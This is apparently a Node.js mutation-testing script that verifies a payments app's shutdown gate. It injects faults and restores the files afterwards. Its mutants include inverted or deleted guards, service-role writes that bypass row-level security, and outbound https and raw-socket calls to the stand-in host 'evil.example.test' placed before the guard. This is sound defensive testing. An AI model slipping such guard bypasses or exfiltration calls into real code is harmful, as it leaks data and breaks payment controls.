#!/usr/bin/env node
/**
 * Mutation protocol for the D-078 legacy shutdown gate.
 *
 * The previous shutdown attempt ran mutants too, and they all "died" — but they
 * were mutants the design happened to catch (moving the guard, changing the flag
 * default, editing .gitignore). None attacked the design itself, and the two
 * that mattered — inverting the gate and deleting the return — were never tried.
 * When the reviewer tried them, the suite stayed green. Those two are now M1 and
 * M2 and are non-negotiable members of this set.
 *
 * FIVE-CONDITION PROTOCOL, enforced per mutant:
 *   1. pristine gate is GREEN before the mutation
 *   2. the mutation is verified to have LANDED (file content actually changed)
 *   3. the gate turns RED
 *   4. the source is restored byte-for-byte
 *   5. the gate is GREEN again
 * A mutant that skips any condition is not a kill. The null control mutates
 * nothing and must stay green throughout; if it ever goes red the whole run is
 * void, because that means the gate is unstable rather than discriminating.
 */
import { readFileSync, writeFileSync, existsSync, mkdirSync, rmSync, rmdirSync } from "node:fs";
import path from "node:path";
import { execFileSync } from "node:child_process";

const ROOT = process.cwd();
const GATE = ["npm", ["test", "--silent"]];

function gateGreen() {
  try {
    execFileSync(GATE[0], GATE[1], { cwd: ROOT, stdio: "pipe" });
    return true;
  } catch {
    return false;
  }
}

const read = (f) => readFileSync(f, "utf8");

/**
 * Each mutant: a file, and a transform. `equivalent: true` marks a mutant that
 * CANNOT change behaviour, so staying green is the correct outcome and is never
 * counted as a kill or as an escape.
 */
const MUTANTS = [
  {
    id: "M0-null-control",
    file: "lib/payments/legacy-enabled.ts",
    why: "no change at all; proves the gate is stable, not merely noisy",
    nullControl: true,
    apply: (s) => s,
  },
  {
    id: "M1-invert-gate",
    file: "app/api/payments/record-offline/route.ts",
    why: "the exact mutation that survived the first attempt: fail OPEN",
    apply: (s) =>
      s.replace(
        "if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        "if (legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
      ),
  },
  {
    id: "M2-delete-return",
    file: "app/api/payments/email-link/route.ts",
    why: "the second mutation that survived: guard evaluated, result discarded",
    apply: (s) =>
      s.replace(
        "if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        "const _unused = !legacyPaymentsEnabled();",
      ),
  },
  {
    id: "M3-and-false",
    file: "app/api/payments/generate-link/route.ts",
    why: "gate can never fire; a plausible merge accident",
    apply: (s) =>
      s.replace(
        "if (!legacyPaymentsEnabled())",
        "if (!legacyPaymentsEnabled() && false)",
      ),
  },
  {
    id: "M4-acknowledging-success",
    file: "lib/payments/legacy-enabled.ts",
    why: "refusal becomes a 200 the caller reads as success — the tombstone the founder rejected",
    apply: (s) => s.replace("status: 503", "status: 200"),
  },
  {
    id: "M5-new-unguarded-writer",
    file: "app/api/payments/new-legacy-writer-probe/route.ts",
    create: true,
    why: "a legacy writer added later must not be able to slip in unguarded",
    apply: () => `import { createClient } from "@supabase/supabase-js";
export async function POST() {
  const db = createClient("http://localhost", "k");
  await db.from("donations").insert({ amount_cents: 1 });
  return new Response("ok");
}
`,
  },
  {
    id: "M6-remove-edge-guard",
    file: "supabase/functions/stripe-webhook/index.ts",
    why: "the live Stripe Edge Function loses its refusal",
    apply: (s) =>
      s.replace(
        /  if \(!legacyPaymentsEnabled\(\)\) \{[\s\S]*?\n  \}\n/,
        "",
      ),
  },
  {
    id: "M8-restore-browser-mutation",
    file: "app/dashboard/[id]/MemberFinancialSection.tsx",
    why: "the browser-direct write this remediation removed must not be able to come back",
    apply: (s) =>
      s +
      `
// Mutant only: a browser-side write to a retired financial table.
async function __restoredBrowserWrite(db: { from: (t: string) => any }) {
  await db.from("financial_commitments").update({ status: "paid" }).eq("id", "x");
}
`,
  },
  {
    id: "M9-remove-replacement-guard",
    file: "app/api/payments/adjust-commitment/route.ts",
    why: "the endpoint that replaced the browser write must itself fail closed",
    apply: (s) =>
      s.replace(
        "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();\n",
        "",
      ),
  },
  {
    id: "M10-invert-replacement-guard",
    file: "app/api/payments/adjust-commitment/route.ts",
    why: "inverting the replacement guard makes it fail OPEN",
    apply: (s) =>
      s.replace(
        "if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        "if (legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
      ),
  },
  {
    id: "M11-replacement-uses-service-role",
    file: "app/api/payments/adjust-commitment/route.ts",
    why: "service-role would bypass RLS and drop auth.uid(), losing the authorisation the browser write had",
    apply: (s) =>
      s.replace(
        "  const { error } = await supabase\n    .from(\"financial_commitments\")",
        '  const { createClient: __svc } = await import("@supabase/supabase-js");\n' +
          "  const { error } = await __svc(\n" +
          "    process.env.NEXT_PUBLIC_SUPABASE_URL!,\n" +
          "    process.env.SUPABASE_SERVICE_ROLE_KEY!,\n" +
          "  )\n    .from(\"financial_commitments\")",
      ),
  },
  {
    id: "M12-square-signature-always-valid",
    file: "app/api/square/webhook/route.ts",
    why: "if the signature check is toothless, the Square positive control reaches its write for the wrong reason",
    apply: (s) =>
      s.replace(
        "  return timingSafeEqual(expected, provided);",
        "  return true;",
      ),
  },
  {
    // Independent review found this one SURVIVING. The suppression on the two
    // onboarding writers had no positive control behind it, so deleting the
    // guard outright was invisible. Both are now first-class mutants.
    id: "M13-remove-approve-member-suppression",
    file: "app/api/approve-member/route.ts",
    why: "deleting the onboarding write-suppression must not be invisible",
    apply: (s) =>
      s.replace("if (journeyId && legacyPaymentsEnabled()) {", "if (journeyId) {"),
  },
  {
    id: "M14-remove-add-member-suppression",
    file: "app/api/add-member-manually/route.ts",
    why: "same hole in the second onboarding writer",
    apply: (s) =>
      s.replace(
        "if (journeyRow?.id && legacyPaymentsEnabled()) {",
        "if (journeyRow?.id) {",
      ),
  },
  {
    // Review finding 3: the inventory used to accept a MENTION of the guard as
    // proof, so a guard parked in unreachable code classified the file as
    // guarded while the write ran unconditionally.
    id: "M15-guard-hidden-in-dead-code",
    file: "app/api/payments/sync-program-price/route.ts",
    why: "a guard that cannot execute must not count as a guard",
    apply: (s) =>
      s.replace(
        "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        "  if (false) { legacyPaymentsEnabled(); }",
      ),
  },
  {
    /**
     * Review finding: `components/` (95 files) was outside SCAN_DIRS, so a
     * browser-side writer planted there was certified clean. Note that M5 and M8
     * both plant writers INSIDE already-scanned directories — neither tested the
     * scope boundary, which is why the hole survived. This mutant tests it.
     */
    id: "M16-writer-in-unscanned-components-dir",
    file: "components/dashboard/__legacy_probe.tsx",
    create: true,
    why: "a writer in components/ must not be invisible to the gate",
    apply: () => `"use client";
import { createClient } from "@supabase/supabase-js";
export function LegacyProbe() {
  const db = createClient("http://localhost", "k");
  const go = async () => {
    await db.from("financial_commitments").update({ status: "paid" }).eq("id", "x");
  };
  return go;
}
`,
  },
  {
    id: "M17-writer-in-brand-new-top-level-dir",
    file: "srcprobe/legacy-writer.ts",
    create: true,
    why: "a source directory nobody added to SCAN_DIRS must fail the gate, not be skipped silently",
    apply: () => `import { createClient } from "@supabase/supabase-js";
export async function write() {
  const db = createClient("http://localhost", "k");
  await db.from("donations").insert({ amount_cents: 1 });
}
`,
  },
  {
    /**
     * Round-4 finding H1. The scanner only emitted .ts/.tsx/.mts, so a .js route
     * handler was invisible — yet Next/SWC compiles and ships it, making it a
     * live, deployable, unguarded money route. `allowJs: false` stops `tsc`, not
     * the build.
     */
    id: "M18-js-extension-writer",
    file: "app/api/zz-js-probe/route.js",
    create: true,
    why: "a .js route handler is deployable and must not be invisible to the gate",
    apply: () => `import { createClient } from "@supabase/supabase-js";
export async function POST() {
  const db = createClient("http://localhost", "k");
  await db.from("donations").insert({ amount_cents: 1 });
  return new Response("ok");
}
`,
  },
  {
    /** Round-4 finding H3: SKIP was unanchored, so any dir named "out" was skipped. */
    id: "M19-writer-in-nested-dir-named-out",
    file: "lib/out/legacy-writer.ts",
    create: true,
    why: "an unanchored skip pattern must not hide a writer in a NESTED dir named out/ (root out/ is M23)",
    apply: () => `import { createClient } from "@supabase/supabase-js";
export async function write() {
  const db = createClient("http://localhost", "k");
  await db.from("payment_tokens").insert({ token: "x" });
}
`,
  },
  {
    /**
     * Round-4 finding H4: root-level source files were never scanned, and
     * middleware.ts runs on EVERY production request.
     */
    id: "M20-writer-in-root-middleware",
    file: "middleware.ts",
    why: "middleware runs on every request; a writer there must not be invisible",
    apply: (s) =>
      s +
      `
// Mutant only: unguarded legacy write at the root level.
export async function __legacyProbe(db: { from: (t: string) => any }) {
  await db.from("donations").insert({ amount_cents: 1 });
}
`,
  },
  {
    /**
     * Round-4 finding H2: patching `lib.default` left ESM named imports live,
     * and review issued a real TLS connection through one.
     */
    id: "M21-named-import-https-before-guard",
    file: "app/api/payments/revoke-token/route.ts",
    why: "an outbound request via a named node:https import must be recorded and blocked",
    apply: (s) =>
      s.replace(
        'import { NextResponse } from "next/server";',
        'import { NextResponse } from "next/server";\nimport { request as __exfil } from "node:https";',
      ).replace(
        "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        '  __exfil("https://evil.example.test/leak");\n' +
          "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
      ),
  },
  {
    /**
     * Round-5 HOLE 1. `SKIP` excluded files by FILENAME (`*.test.ts`), but such a
     * file is an ordinary module. Review built a live, deployable, unguarded POST
     * route that imported one and wrote three retired tables with service-role
     * credentials — and the gate certified it clean.
     */
    id: "M22-production-writer-in-test-named-file",
    file: "lib/payments/vkhelper.test.ts",
    create: true,
    why: "a module is not exempt from the gate because of its filename",
    apply: () => `import { createClient } from "@supabase/supabase-js";
export async function recordDonation(amount: number) {
  const sb = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!,
  );
  await sb.from("donations").insert({ amount_cents: amount });
}
`,
  },
  {
    /**
     * Round-5 HOLE 2. `out` was in IGNORED_TOP_LEVEL and ALSO matched by SKIP,
     * so the "verified" audit walked it with a walker that always returned
     * nothing — the check could never fire for the one directory it named.
     */
    id: "M23-writer-in-root-out-dir",
    file: "out/legacy-writer.ts",
    create: true,
    why: "the scope audit must not be pre-empted by the scan's own skip rules",
    apply: () => `import { createClient } from "@supabase/supabase-js";
export async function write() {
  const db = createClient("http://localhost", "k");
  await db.from("donations").insert({ amount_cents: 1 });
}
`,
  },
  {
    /** Round-5 HOLE 3: raw socket egress was silent-live. */
    id: "M24-raw-socket-exfil-before-guard",
    file: "app/api/payments/adjust-booked/route.ts",
    why: "a raw node:net socket opened before the guard must be recorded and blocked",
    apply: (s2) =>
      s2.replace(
        'import { NextResponse } from "next/server";',
        'import { NextResponse } from "next/server";\nimport { connect as __sock } from "node:net";',
      ).replace(
        "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        '  __sock(443, "evil.example.test");\n' +
          "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
      ),
  },
  {
    /**
     * Round-6 H1. `db["from"]("donations")` — one character different from M5 —
     * matched nothing in the AST walker and shipped as a deployable unguarded
     * money route with the whole gate green.
     */
    id: "M25-computed-member-access-writer",
    file: "app/api/payments/__computed-probe/route.ts",
    create: true,
    why: "computed member access must not evade the writer inventory",
    apply: () => `import { createClient } from "@supabase/supabase-js";
export async function POST() {
  const db = createClient("http://localhost", "k");
  await db["from"]("donations").insert({ amount_cents: 1 });
  return new Response("ok");
}
`,
  },
  {
    /**
     * Round-6 H2. `guarded` was one boolean per FILE, so a second exported
     * handler inherited the guarded status of the first.
     */
    id: "M26-second-unguarded-handler",
    file: "app/api/payments/adjust-commitment/route.ts",
    why: "every exported handler must reach the guard, not just the first one",
    apply: (s2) =>
      s2 +
      `
export async function DELETE(req: Request) {
  const db = await createServerSupabase();
  await db.from("financial_commitments").update({ expected_amount_cents: 0 }).eq("id", "x");
  return NextResponse.json({ ok: true });
}
`,
  },
  {
    /** Round-6 H3: `new net.Socket().connect()` reached the network silently. */
    id: "M27-socket-class-exfil-before-guard",
    file: "app/api/payments/adjust-collected/route.ts",
    why: "class-based socket egress must be recorded, not just the module-level helpers",
    apply: (s2) =>
      s2.replace(
        'import { NextResponse } from "next/server";',
        'import { NextResponse } from "next/server";\nimport net from "node:net";',
      ).replace(
        "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        '  new net.Socket().connect(443, "api.stripe.com");\n' +
          "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
      ),
  },
  {
    /** Round-7 H1: `export const POST = async () => {}` is a VariableStatement,
     *  so the per-handler detector never saw it and fell back to the file flag. */
    id: "M28-arrow-function-handler-unguarded",
    file: "app/api/payments/revoke-token/route.ts",
    why: "arrow-function handlers must be subject to the per-handler guard check",
    apply: (s2) =>
      s2 +
      `
export const DELETE = async (req: Request) => {
  const svc = createServiceSupabase(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);
  await svc.from("financial_commitments").update({ expected_amount_cents: 0 }).eq("id", "x");
  return NextResponse.json({ ok: true });
};
`,
  },
  {
    /** Round-7 H2: `export { nukeIt as DELETE }` was invisible. */
    id: "M29-re-export-alias-handler",
    file: "app/api/payments/revoke-token/route.ts",
    why: "a handler exported under an alias is still a handler",
    apply: (s2) =>
      s2 +
      `
async function nukeIt() {
  const svc = createServiceSupabase(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);
  await svc.from("donations").delete().eq("id", "x");
  return NextResponse.json({ ok: true });
}
export { nukeIt as DELETE };
`,
  },
  {
    /** Round-7 H3: call-graph edges only followed bare identifiers. */
    id: "M30-write-via-member-call",
    file: "app/api/payments/revoke-token/route.ts",
    why: "reachability must follow obj.helper(), not only helper()",
    apply: (s2) =>
      s2 +
      `
const __helpers = { async wipe() {
  const svc = createServiceSupabase(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);
  await svc.from("donations").delete().eq("id", "x");
} };
export async function DELETE() { await __helpers.wipe(); return NextResponse.json({ ok: true }); }
`,
  },
  {
    /** Round-7 H4: a destructured `.from` made the write vanish from the census. */
    id: "M31-destructured-from-alias",
    file: "app/api/payments/revoke-token/route.ts",
    why: "a write the analyzer cannot resolve must fail the gate, not disappear",
    apply: (s2) =>
      s2 +
      `
export async function PUT() {
  const svc = createServiceSupabase(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);
  const { from } = svc as any;
  await from.call(svc, "donations").insert({ amount_cents: 1 });
  return NextResponse.json({ ok: true });
}
`,
  },
  {
    /** Round-7 H5: http2 was the silent transport a real Stripe client would use. */
    id: "M32-http2-exfil-before-guard",
    file: "app/api/payments/sync-program-price/route.ts",
    why: "http2 egress must be recorded and blocked like http/https",
    apply: (s2) =>
      s2.replace(
        'import { NextResponse } from "next/server";',
        'import { NextResponse } from "next/server";\nimport http2 from "node:http2";',
      ).replace(
        "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
        '  http2.connect("https://api.stripe.com");\n' +
          "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();",
      ),
  },
  {
    id: "M7-remove-square-webhook-guard",
    file: "app/api/square/webhook/route.ts",
    why: "the live Square webhook loses its refusal",
    apply: (s) =>
      s.replace(
        "  if (!legacyPaymentsEnabled()) return legacyPaymentsDisabledResponse();\n",
        "",
      ),
  },
];

let createdDirs = [];
const results = [];
let voided = null;

console.log("verifying pristine gate before starting...");
if (!gateGreen()) {
  console.error("ABORT: gate is not green before mutation. Nothing is provable.");
  process.exit(2);
}
console.log("pristine gate GREEN\n");

for (const m of MUTANTS) {
  const original = m.create ? null : read(m.file);
  let verdict;

  try {
    // Condition 2: the mutation must actually land.
    const mutated = m.apply(original ?? "");
    if (m.create) {
      // Record which directories WE create, so cleanup removes only those.
      const dir = m.file.replace(/\/[^/]+$/, "");
      createdDirs = [];
      const parts = dir.split("/");
      for (let i = 1; i <= parts.length; i++) {
        const d = parts.slice(0, i).join("/");
        if (!existsSync(path.join(ROOT, d))) createdDirs.push(d);
      }
      mkdirSync(path.join(ROOT, dir), { recursive: true });
      writeFileSync(m.file, mutated);
    } else if (mutated === original && !m.nullControl) {
      results.push({ id: m.id, verdict: "NOT-APPLIED", note: "pattern did not match — mutant is void" });
      continue;
    } else {
      writeFileSync(m.file, mutated);
    }

    // Condition 3: the gate must react.
    const green = gateGreen();
    if (m.nullControl) {
      verdict = green ? "CONTROL-OK" : "CONTROL-FAILED";
      if (!green) voided = "null control went red: the gate is unstable";
    } else {
      verdict = green ? "SURVIVED" : "KILLED";
    }
  } finally {
    // Condition 4: restore byte-for-byte.
    //
    // Remove ONLY the file we wrote, then only the directories we ourselves
    // created, innermost first, and only while they are empty. A previous
    // version did `rm -rf` on the file's parent directory — which for a mutant
    // planted in `components/dashboard/` would have deleted real application
    // source. Restoring a mutation must never be able to destroy the tree.
    if (m.create) {
      rmSync(path.join(ROOT, m.file), { force: true });
      for (const d of [...createdDirs].reverse()) {
        try {
          rmdirSync(path.join(ROOT, d));
        } catch {
          break; // not empty, or not ours to remove — leave it alone
        }
      }
      createdDirs = [];
    } else {
      writeFileSync(m.file, original);
    }
  }

  // Condition 5: green again, or the restore was incomplete.
  const restored = gateGreen();
  if (!restored) voided = `gate did not return to green after ${m.id}`;

  results.push({ id: m.id, verdict, restored, why: m.why });
  console.log(`${verdict.padEnd(14)} ${m.id.padEnd(32)} restored=${restored}`);
}

console.log("\n--- summary ---");
const killable = results.filter((r) => !r.id.startsWith("M0"));
const killed = killable.filter((r) => r.verdict === "KILLED");
const survived = killable.filter((r) => r.verdict !== "KILLED");
console.log(`killable mutants: ${killable.length}`);
console.log(`killed:           ${killed.length}`);
console.log(`survived/void:    ${survived.length}${survived.length ? " -> " + survived.map((s) => s.id + ":" + s.verdict).join(", ") : ""}`);
console.log(`null control:     ${results.find((r) => r.id.startsWith("M0"))?.verdict}`);
if (voided) {
  console.log(`\nRUN VOID: ${voided}`);
  process.exit(3);
}
process.exit(survived.length ? 1 : 0);
